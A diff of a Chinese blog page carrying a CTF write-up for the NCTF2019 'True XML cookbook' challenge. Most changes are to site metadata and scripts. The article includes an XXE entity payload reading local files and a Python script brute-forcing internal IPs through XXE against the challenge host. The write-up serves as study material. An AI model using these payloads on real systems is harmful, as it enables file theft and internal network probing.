@@ -27,23 +27,23 @@
 
   
   
-    <meta name="description" content="知识点：1234XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。XML解释器支持多种协议，其中PHP就支持http和gopher，所以可能flag存在于内网主机上，我们需要通过XXE对内网进行探测**内网信息可以查看**&#x2F;etc&#x2F;hosts(主机名与 IP 映射)、&#x2F;pro">
+    <meta name="description" content="知识点： 1234XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。XML解释器支持多种协议，其中PHP就支持http和gopher，所以可能flag存在于内网主机上，我们需要通过XXE对内网进行探测**内网信息可以查看**&#x2F;etc&#x2F;hosts(主机名与 IP 映射)、&#x2F;p">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[NCTF2019]True XML cookbook">
 <meta property="og:url" content="http://example.com/2025/04/01/[NCTF2019]True%20XML%20cookbook/index.html">
 <meta property="og:site_name" content="KL">
-<meta property="og:description" content="知识点：1234XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。XML解释器支持多种协议，其中PHP就支持http和gopher，所以可能flag存在于内网主机上，我们需要通过XXE对内网进行探测**内网信息可以查看**&#x2F;etc&#x2F;hosts(主机名与 IP 映射)、&#x2F;pro">
+<meta property="og:description" content="知识点： 1234XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。XML解释器支持多种协议，其中PHP就支持http和gopher，所以可能flag存在于内网主机上，我们需要通过XXE对内网进行探测**内网信息可以查看**&#x2F;etc&#x2F;hosts(主机名与 IP 映射)、&#x2F;p">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/20250401194212461.png">
-<meta property="og:image" content="http://example.com/images/20250401194327700.png">
-<meta property="og:image" content="http://example.com/images/20250401194537920.png">
+<meta property="og:image" content="http://example.com/2025/04/01/images/20250401194212461.png">
+<meta property="og:image" content="http://example.com/2025/04/01/images/20250401194327700.png">
+<meta property="og:image" content="http://example.com/2025/04/01/images/20250401194537920.png">
 <meta property="article:published_time" content="2025-04-01T11:36:59.000Z">
 <meta property="article:modified_time" content="2025-04-08T15:39:20.586Z">
-<meta property="article:author" content="fuboy">
+<meta property="article:author" content="FuB0Y">
 <meta property="article:tag" content="xxe进阶">
 <meta property="article:tag" content="xxe探测内网信息">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/20250401194212461.png">
+<meta name="twitter:image" content="http://example.com/2025/04/01/images/20250401194212461.png">
   
   
     <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
@@ -55,6 +55,14 @@
 <link rel="stylesheet" href="/css/style.css">
 
   <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
   
   
   
@@ -200,20 +208,20 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">知识点：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> 知识点：</span></a></li></ol>
       
   </div>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -221,7 +229,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -303,35 +311,31 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。</span><br><span class="line"></span><br><span class="line">XML解释器支持多种协议，其中PHP就支持http和gopher，所以可能flag存在于内网主机上，我们需要通过XXE对内网进行探测**</span><br><span class="line">内网信息可以查看**/etc/hosts(主机名与 IP 映射)、/proc/net/arp(内网活跃设备)、proc/net/fib_trie(内网子网结构和路由策略)**等等</span><br></pre></td></tr></table></figure>
-
-<p> 这题的界面和ctfshow上xxe最后一题很像</p>
-<p><img src="/../images/20250401194212461.png" alt="image-20250401194212461"></p>
+        <h2 id="知识点"><a class="markdownIt-Anchor" href="#知识点"></a> 知识点：</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。</span><br><span class="line"></span><br><span class="line">XML解释器支持多种协议，其中PHP就支持http和gopher，所以可能flag存在于内网主机上，我们需要通过XXE对内网进行探测**</span><br><span class="line">内网信息可以查看**/etc/hosts(主机名与 IP 映射)、/proc/net/arp(内网活跃设备)、proc/net/fib_trie(内网子网结构和路由策略)**等等</span><br></pre></td></tr></table></figure>
+<p>这题的界面和ctfshow上xxe最后一题很像</p>
+<p><img src="../images/20250401194212461.png" alt="image-20250401194212461" /></p>
 <p>题目界面</p>
 <p>我们抓包查看</p>
-<p><img src="/../images/20250401194327700.png" alt="image-20250401194327700"></p>
+<p><img src="../images/20250401194327700.png" alt="image-20250401194327700" /></p>
 <p>我们看到请求包和响应包都是xml格式</p>
 <p>那我们就猜测它为xxe注入</p>
-<p>我们用xxe来读取一下&#x2F;etc&#x2F;passwd，看是否能访问到</p>
+<p>我们用xxe来读取一下/etc/passwd，看是否能访问到</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE evil [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/20250401194537920.png" alt="image-20250401194537920"></p>
+<p><img src="../images/20250401194537920.png" alt="image-20250401194537920" /></p>
 <p>发现能访问到</p>
-<p>那我们再试一下&#x2F;flag</p>
+<p>那我们再试一下/flag</p>
 <p>发现无该路径</p>
 <p><strong>重点：XML解释器支持多种协议，其中PHP就支持http和gopher，所以可能flag存在于内网主机上，我们需要通过XXE对内网进行探测</strong></p>
-<p>内网信息可以查看**&#x2F;etc&#x2F;hosts(主机名与 IP 映射)、&#x2F;proc&#x2F;net&#x2F;arp(内网活跃设备)、proc&#x2F;net&#x2F;fib_trie(内网子网结构和路由策略)**等等</p>
+<p>内网信息可以查看**/etc/hosts(主机名与 IP 映射)、/proc/net/arp(内网活跃设备)、proc/net/fib_trie(内网子网结构和路由策略)**等等</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts</span><br><span class="line">包含的内网信息：</span><br><span class="line">本地主机名和 IP 地址（如 127.0.0.1 localhost）</span><br><span class="line">手动添加的内网主机名和 IP 地址（如 192.168.1.100 server1）</span><br><span class="line">可能暴露内网服务器的主机名、域名或别名（如 10.0.0.5 internal-api）</span><br><span class="line"></span><br><span class="line">/proc/net/arp</span><br><span class="line">包含的内网信息：</span><br><span class="line">内网活跃设备的 IP 地址（如 192.168.1.x）</span><br><span class="line">内网设备的 MAC 地址（可推断厂商或设备类型）</span><br><span class="line">网络接口名称（如 eth0）及 ARP 状态（如 REACHABLE）</span><br><span class="line">可能暴露内网拓扑（如网关、其他服务器）</span><br><span class="line"></span><br><span class="line">/proc/net/fib_trie</span><br><span class="line">包含的内网信息：</span><br><span class="line">本地 IP 地址（如 127.0.0.1 或内网地址 192.168.1.100）。</span><br><span class="line">内网子网范围（如 192.168.1.0/24）。</span><br><span class="line">网关和广播地址。</span><br><span class="line">可能暴露多网卡配置或 VPN 路由（如 10.8.0.0/24）</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">扫描结果：</span><br><span class="line">/etc/hosts</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">ff02::3 ip6-allhosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line"></span><br><span class="line">/proc/net/arp</span><br><span class="line">IP address       HW type     Flags       HW address            Mask     Device</span><br><span class="line">192.168.122.16   0x1         0x2         ee:ee:ee:ee:ee:ee     *        eth0</span><br><span class="line">169.254.1.1      0x1         0x2         ee:ee:ee:ee:ee:ee     *        eth0</span><br><span class="line"></span><br><span class="line">/proc/net/fib_trie</span><br><span class="line"> +-- 0.0.0.0/0 3 0 5</span><br><span class="line">     +-- 0.0.0.0/4 2 0 2</span><br><span class="line">        |-- 0.0.0.0</span><br><span class="line">           /0 universe UNICAST</span><br><span class="line">        |-- 10.244.244.73</span><br><span class="line">           /32 host LOCAL</span><br><span class="line">     +-- 127.0.0.0/8 2 0 2</span><br><span class="line">        +-- 127.0.0.0/31 1 0 0</span><br><span class="line">           |-- 127.0.0.0</span><br><span class="line">              /8 host LOCAL</span><br><span class="line">           |-- 127.0.0.1</span><br><span class="line">              /32 host LOCAL</span><br><span class="line">        |-- 127.255.255.255</span><br><span class="line">           /32 link BROADCAST</span><br><span class="line">     |-- 169.254.1.1</span><br><span class="line">        /32 link UNICAST</span><br><span class="line">Local:</span><br><span class="line">  +-- 0.0.0.0/0 3 0 5</span><br><span class="line">     +-- 0.0.0.0/4 2 0 2</span><br><span class="line">        |-- 0.0.0.0</span><br><span class="line">           /0 universe UNICAST</span><br><span class="line">        |-- 10.244.244.73</span><br><span class="line">           /32 host LOCAL</span><br><span class="line">     +-- 127.0.0.0/8 2 0 2</span><br><span class="line">        +-- 127.0.0.0/31 1 0 0</span><br><span class="line">           |-- 127.0.0.0</span><br><span class="line">              /8 host LOCAL</span><br><span class="line">           |-- 127.0.0.1</span><br><span class="line">              /32 host LOCAL</span><br><span class="line">        |-- 127.255.255.255</span><br><span class="line">           /32 link BROADCAST</span><br><span class="line">     |-- 169.254.1.1</span><br><span class="line">        /32 link UNICAST</span><br></pre></td></tr></table></figure>
-
 <p>至于后面分析的东西属于玄学了(其实是我还没学计算机网络，看不懂)</p>
 <p>看题解说：</p>
-<p>在&#x2F;proc&#x2F;net&#x2F;arp中有个ip：169.254.1.1</p>
+<p>在/proc/net/arp中有个ip：169.254.1.1</p>
 <p>但是输入这个IP后会报错，那么应该是最后一位错误了，至于为什么是最后一位建议先去学习一下计算机网络，因为我也看不懂</p>
 <p>直接使用脚本去爆破最后一位</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests as res</span><br><span class="line">url=&quot;http://c24e222c-af4a-4bde-883d-1c1ee50a63ed.node5.buuoj.cn:81/doLogin.php&quot;</span><br><span class="line">rawPayload=&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;!DOCTYPE user [&#x27;\</span><br><span class="line">         &#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://10.244.80.&#123;&#125;&quot;&gt;&#x27;\</span><br><span class="line">         &#x27;]&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;user&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;username&gt;&#x27;\</span><br><span class="line">         &#x27;&amp;payload1;&#x27;\</span><br><span class="line">         &#x27;&lt;/username&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;password&gt;&#x27;\</span><br><span class="line">         &#x27;23&#x27;\</span><br><span class="line">         &#x27;&lt;/password&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;/user&gt;&#x27;</span><br><span class="line">for i in range(1,256):</span><br><span class="line">    payload=rawPayload.format(i)</span><br><span class="line">    #payload=rawPayload</span><br><span class="line">    print(str(&quot;#&#123;&#125; =&gt;&quot;).format(i),end=&#x27;&#x27;)</span><br><span class="line">    try:</span><br><span class="line">        resp=res.post(url,data=payload,timeout=0.3)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        print(resp.text,end=&#x27;&#x27;)</span><br><span class="line">    finally:</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>然后直接用http协议利用xxe漏洞访问爆破出来的ip</p>
 <p>就能得到flag</p>
 
@@ -359,7 +363,7 @@
         
           
           
-            <img data-src="../images/1737907114de8a.jpg" data-sizes="auto" alt="[HITCON 2017]SSRFme" class="lazyload">
+            <img data-src="/images/1737907114de8a.jpg" data-sizes="auto" alt="[HITCON 2017]SSRFme" class="lazyload">
           
         
         <a href="/2025/04/01/%5BHITCON%202017%5DSSRFme/"></a>
@@ -409,7 +413,7 @@
       <span class="icon-copyright"></span>
       2020-2025
       <span class="footer-info-sep rotate"></span>
-      fuboy
+      FuB0Y
     </div>
     
       <div>
@@ -420,10 +424,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        115.8k
+        284k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        07:58
+        20:48
       </div>
     
     
@@ -455,20 +459,20 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">知识点：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> 知识点：</span></a></li></ol>
       
   </div>
 </div>
 </div>
       <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -476,7 +480,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -596,12 +600,12 @@
       
       <script data-pjax>
         window.REIMU_POST = {
-          author: "fuboy",
+          author: "FuB0Y",
           title: "[NCTF2019]True XML cookbook",
           url: "http://example.com/2025/04/01/[NCTF2019]True%20XML%20cookbook/",
           excerpt: "",
           description: "",
-          stripContent: "知识点：1234XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。XML解释器支持多种协议，其中PHP就支持http和gopher，所以可能flag存在于内网主机上，我们需要通过XXE对内网进行探测**内网信息可以查看**/etc/hosts(主机名与 IP 映射)、/proc/net/arp(内网活跃设备)、proc/net/fib_trie(内网子网结构和路由策略)**",
+          stripContent: " 知识点： 1234XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。XML解释器支持多种协议，其中PHP就支持http和gopher，所以可能flag存在于内网主机上，我们需要通过XXE对内网进行探测**内网信息可以查看**/etc/hosts(主机名与 IP 映射)、/proc/net/arp(内网活跃设备)、proc/net/fib_trie(内网子网结构和路由策略)",
           date: "Tue Apr 01 2025 19:36:59 GMT+0800",
           updated: "Tue Apr 08 2025 23:39:20 GMT+0800",
           cover: "/../images/17384736097c9d.jpg",
@@ -691,6 +695,15 @@
 </script>
 
 
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
 
 
 
